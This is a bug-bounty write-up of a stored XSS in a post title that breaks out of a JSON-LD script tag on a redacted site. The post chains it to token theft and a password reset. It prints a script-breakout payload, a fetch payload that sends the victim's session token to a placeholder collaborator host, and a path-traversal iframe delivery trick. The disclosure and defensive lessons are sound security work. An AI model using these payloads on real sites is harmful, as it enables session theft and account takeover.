---
title: "A Post Title That Took Over Your Account"
date: 2026-06-22
draft: false
tags: ["stored-xss", "account-takeover", "xss"]
categories: ["writeup"]
summary: "A post title got reflected into a script tag, which gave me stored XSS. From there I pulled the victim's session token from an API endpoint and reset their password without the old one. One click, full account takeover."
ShowToc: true
TocOpen: false
---

## TL;DR

A post title on `redacted.com` was reflected straight into a `<script>` block with no sanitization. That gave me stored XSS. From there I grabbed the victim's session token from an API endpoint that returned it in plaintext, then used a second endpoint to reset their password without knowing the old one. One click, full account takeover. Resolved as High (8.5), $2,550 bounty.

## The Endpoint

The target has a metadata endpoint that renders SEO data for any route on the site:

```
GET /api/content/route/metadata/html?route=<path>
```

Feed it the path to a profile or a post and it returns an HTML page with a JSON-LD block describing that content. The block is a `<script type="application/ld+json">` tag holding a `BreadcrumbList`. Standard SEO boilerplate.

The catch: part of that JSON is built from user content.

## The XSS

I made a post on my profile and set the title to a string I could grep for in the response. It showed up inside the JSON-LD block as a `name` value:

```html
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    { "item": { "name": "MY_POST_TITLE" } }
  ]
}
</script>
```

Inside a script tag, HTML entity encoding doesn't help you. The browser scans for `</script>` before it cares about anything else. So I set my post title to this:

```html
</script><script>alert(document.cookie)</script>
```

Then loaded:

```
GET /api/content/route/metadata/html?route=/u/aaa/up/posts/{postId}
```

The original script tag closed early, my injected one ran. Post titles allowed plenty of length, so there was room for a real payload instead of a toy `alert`.

## Getting Past HttpOnly

The session cookie was `HttpOnly`, so reading `document.cookie` was a dead end. Didn't matter. There was an API endpoint that returned the session token in the response body:

```
GET /api/users/me/jwt
```

`HttpOnly` stops JavaScript from reading the cookie. It does nothing when the same token is sitting in an API response that JavaScript can `fetch`. The payload became:

```javascript
fetch('/api/users/me/jwt')
  .then(r => r.text())
  .then(t => fetch('https://{COLLABORATOR}/?token=' + t))
```

Victim loads the link, their token lands on my server.

## Token to Password Reset

A stolen token lasts as long as the session does. I wanted something permanent. Changing the password the normal way needs the current password, which I didn't have.

There was an endpoint at `media.redacted.com/qr/login`, built for logging into another device by QR code. Send it a request with the stolen token in the `hmac_signed_session` cookie and it returned a QR code image. That QR code encoded a direct password reset link, and that link didn't ask for the current password.

Full chain:

1. Steal the token through the XSS
2. Hit the QR login endpoint with the token
3. Follow the reset link from the QR code
4. Set a new password

Account taken over.

## Making the Link Look Normal

The weak spot was delivery. Nobody clicks a raw `/api/content/route/metadata/html?route=...` link.

The metadata renderer had a quirk in how it handled external video embeds. I set a media item's `externalVideoSrc` to:

```
youtube.com/a/../../../../../api/content/route/metadata/html?route=/u/aaa/up/posts/{postId}
```

The value was missing its `https://www`, so it got treated as a relative path. The `../` sequences walked back to root and loaded my payload route inside an iframe on a normal media page. The link the victim sees:

```
https://redacted.com/u/aaa/up/media?mediaId={id}
```

That looks like any other media link. Media can also be shared inside server channels, so a single crafted post could sit in front of a lot of people at once.

## Why It Worked

Three small things stacked into one big one:

- User input reflected into a script context (the XSS)
- An API endpoint handing back the session token in plaintext (kills the `HttpOnly` protection)
- A password reset that trusts the token alone (no current password needed)

Any one on its own is minor. Together they turn a post title into a one-click takeover.

## The Fix

User input in the `name` field of the JSON-LD block is now sanitized. Confirmed on retest.

## Timeline

| Date | Event |
|------|-------|
| 2023-03-23 | Reported XSS, escalated to account takeover and password reset same day |
| 2023-03-26 | Triaged, severity set to High |
| 2023-07-23 | Submitted a more realistic delivery vector (the iframe path traversal) |
| 2023-09-05 | Fix deployed, retest confirmed |
| 2023-09-07 | Resolved |
| 2023-09-13 | Bounty awarded ($2,550) |

## Takeaways

`HttpOnly` protects the cookie, not the session. If any endpoint reflects the token back in a response body, the flag buys you nothing.

Output inside a `<script>` tag needs context-aware encoding. HTML entity encoding is the wrong tool once you are past the opening tag, because the parser is hunting for `</script>`, not entities.

The boring SEO and metadata corners of an app are worth your time. They pull from user content and almost never get the same scrutiny as the main UI.
